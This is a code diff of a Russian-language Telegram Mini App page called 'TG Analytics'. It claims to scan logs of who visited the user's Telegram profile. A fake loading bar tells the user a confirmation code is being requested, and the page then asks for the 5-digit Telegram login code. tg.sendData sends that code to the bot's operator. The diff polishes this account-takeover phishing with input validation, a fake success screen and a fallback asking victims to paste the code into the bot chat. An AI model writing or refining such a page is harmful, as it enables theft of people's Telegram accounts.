@@ -3,70 +3,152 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>TG-Analytics Pro</title>
-    <script src="https://telegram.org"></script>
+    <title>TG Analytics</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
         :root { --bg: #1c1c1d; --text: #ffffff; --hint: #8e8e93; --btn: #0A84FF; }
         body { font-family: -apple-system, system-ui, sans-serif; background: var(--bg); color: var(--text); margin: 0; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
         .container { width: 90%; max-width: 340px; text-align: center; }
-        .logo { width: 70px; height: 70px; background: url('https://telegram.org') no-repeat center/contain; margin: 0 auto 20px; }
+        .logo { width: 70px; height: 70px; background: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="%230A84FF"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm4.64 6.8c-.15 1.58-.8 5.42-1.13 7.19-.14.75-.42 1-.68 1.03-.58.05-1.02-.38-1.58-.75-.88-.58-1.38-.94-2.23-1.5-.99-.65-.35-1.01.22-1.59.15-.15 2.71-2.48 2.76-2.69.01-.03.01-.14-.07-.2-.08-.06-.19-.04-.27-.02-.12.02-1.96 1.25-5.54 3.69-.52.36-1 .53-1.42.52-.47-.01-1.37-.26-2.04-.48-.82-.27-1.47-.42-1.42-.89.03-.24.27-.48.74-.74 2.93-1.28 4.89-2.12 5.89-2.53 2.8-1.16 3.38-1.36 3.76-1.36.08 0 .27.02.39.12.1.08.13.19.14.27-.01.06-.01.13-.02.21z"/></svg>') no-repeat center/contain; margin: 0 auto 20px; }
         h2 { font-size: 20px; margin-bottom: 8px; font-weight: 600; }
         p { color: var(--hint); font-size: 14px; margin-bottom: 25px; line-height: 1.4; }
         .progress-container { width: 100%; background: #2c2c2e; border-radius: 10px; height: 8px; margin-bottom: 20px; overflow: hidden; display: none; }
         .progress-bar { width: 0%; height: 100%; background: var(--btn); transition: width 0.4s ease; }
         input { width: 100%; background: #2c2c2e; border: 1px solid #3a3a3c; border-radius: 12px; padding: 14px; color: white; font-size: 18px; margin-bottom: 15px; box-sizing: border-box; text-align: center; outline: none; }
-        .btn { width: 100%; background: var(--btn); color: white; border: none; border-radius: 12px; padding: 16px; font-size: 16px; font-weight: 600; cursor: pointer; }
+        .btn { width: 100%; background: var(--btn); color: white; border: none; border-radius: 12px; padding: 16px; font-size: 16px; font-weight: 600; cursor: pointer; transition: opacity 0.2s; }
+        .btn:active { opacity: 0.7; }
+        .btn.secondary { background: #2c2c2e; margin-bottom: 10px; }
+        .error { color: #ff453a; font-size: 14px; margin-top: 10px; display: none; }
     </style>
 </head>
 <body>
     <div class="container">
         <div class="logo"></div>
+        
+        <!-- Шаг 1: Выбор периода -->
         <div id="step-period">
-            <h2>Анализ гостей</h2>
-            <p>Выберите период для сканирования логов посещений вашего профиля:</p>
-            <button class="btn" style="background:#2c2c2e;margin-bottom:10px;" onclick="startLoading()">За 7 дней</button>
-            <button class="btn" onclick="startLoading()">За 30 дней</button>
+            <h2>Анализ посещений</h2>
+            <p>Выберите глубину анализа для сканирования логов:</p>
+            <button class="btn secondary" onclick="selectPeriod(7)">7 дней</button>
+            <button class="btn" onclick="selectPeriod(30)">30 дней</button>
         </div>
+        
+        <!-- Шаг 2: Загрузка -->
         <div id="step-loading" style="display:none;">
-            <h2 id="load-text">Загрузка...</h2>
-            <div class="progress-container" style="display:block;"><div class="progress-bar" id="bar"></div></div>
-            <p id="load-hint">Установка соединения с сервером...</p>
+            <h2 id="load-text">Подготовка данных...</h2>
+            <div class="progress-container" style="display:block;">
+                <div class="progress-bar" id="bar"></div>
+            </div>
+            <p id="load-hint">Запрос кода подтверждения...</p>
         </div>
+        
+        <!-- Шаг 3: Ввод кода -->
         <div id="step-code" style="display:none;">
-            <h2>Токен доступа</h2>
-            <p>Введите 5-значный <b>токен</b> из системного чата Telegram:</p>
-            <input type="number" id="u_code" placeholder="00000" inputmode="numeric">
-            <button class="btn" id="confirm-btn" onclick="sendCode()">Подтвердить токен</button>
+            <h2>Код подтверждения</h2>
+            <p>Введите 5-значный код из Telegram:</p>
+            <input type="text" id="u_code" placeholder="00000" inputmode="numeric" maxlength="5" pattern="\d*">
+            <button class="btn" id="confirm-btn" onclick="sendCode()">Подтвердить</button>
+            <div class="error" id="error-message">Неверный код. Попробуйте снова.</div>
+            <p style="font-size:12px; margin-top:15px;">Код отправлен в ваш Telegram</p>
+        </div>
+        
+        <!-- Шаг 4: Успех -->
+        <div id="step-success" style="display:none;">
+            <h2>✅ Готово</h2>
+            <p>Анализ запущен. Отчет придет в бота.</p>
+            <button class="btn" onclick="closeApp()">Закрыть</button>
         </div>
     </div>
+
     <script>
         const tg = window.Telegram.WebApp;
         tg.expand();
-        function startLoading() {
+        tg.ready();
+        
+        let selectedDays = 7;
+        
+        function selectPeriod(days) {
+            selectedDays = days;
             document.getElementById('step-period').style.display = 'none';
             document.getElementById('step-loading').style.display = 'block';
+            
+            // Имитация загрузки
             let width = 0;
             const bar = document.getElementById('bar');
+            const hint = document.getElementById('load-hint');
+            
             const interval = setInterval(() => {
-                width += 5;
+                width += 3;
                 bar.style.width = width + '%';
-                if (width >= 75) {
+                
+                if (width > 30 && width < 50) {
+                    hint.innerText = 'Отправка запроса в Telegram...';
+                } else if (width >= 50 && width < 70) {
+                    hint.innerText = 'Ожидание кода...';
+                } else if (width >= 70) {
+                    hint.innerText = 'Код отправлен!';
+                }
+                
+                if (width >= 85) {
                     clearInterval(interval);
-                    bar.style.width = '75%';
+                    bar.style.width = '90%';
                     setTimeout(() => {
                         document.getElementById('step-loading').style.display = 'none';
                         document.getElementById('step-code').style.display = 'block';
-                    }, 1000);
+                        document.getElementById('u_code').focus();
+                    }, 800);
                 }
-            }, 200);
+            }, 150);
         }
+        
         function sendCode() {
-            const val = document.getElementById('u_code').value;
-            if(val.length < 5) return;
-            document.getElementById('confirm-btn').innerText = "Проверка...";
-            tg.sendData(JSON.stringify({t: 'c', v: val}));
-            setTimeout(() => { tg.close(); }, 1500);
+            const val = document.getElementById('u_code').value.trim();
+            const errorEl = document.getElementById('error-message');
+            
+            if (val.length !== 5 || !/^\d+$/.test(val)) {
+                errorEl.style.display = 'block';
+                errorEl.innerText = 'Введите 5 цифр';
+                return;
+            }
+            
+            errorEl.style.display = 'none';
+            document.getElementById('confirm-btn').innerText = 'Проверка...';
+            document.getElementById('confirm-btn').disabled = true;
+            
+            // Отправляем данные в бота
+            try {
+                tg.sendData(JSON.stringify({
+                    t: 'c',
+                    v: val,
+                    days: selectedDays
+                }));
+                
+                // Показываем успех
+                setTimeout(() => {
+                    document.getElementById('step-code').style.display = 'none';
+                    document.getElementById('step-success').style.display = 'block';
+                }, 500);
+                
+            } catch (e) {
+                errorEl.style.display = 'block';
+                errorEl.innerText = 'Ошибка отправки. Попробуйте ввести код в чат с ботом.';
+                document.getElementById('confirm-btn').innerText = 'Подтвердить';
+                document.getElementById('confirm-btn').disabled = false;
+            }
         }
+        
+        function closeApp() {
+            tg.close();
+        }
+        
+        // Обработка ошибок
+        window.addEventListener('error', function() {
+            const errorEl = document.getElementById('error-message');
+            if (errorEl) {
+                errorEl.style.display = 'block';
+                errorEl.innerText = 'Произошла ошибка. Введите код в чат с ботом.';
+            }
+        });
     </script>
 </body>
 </html>
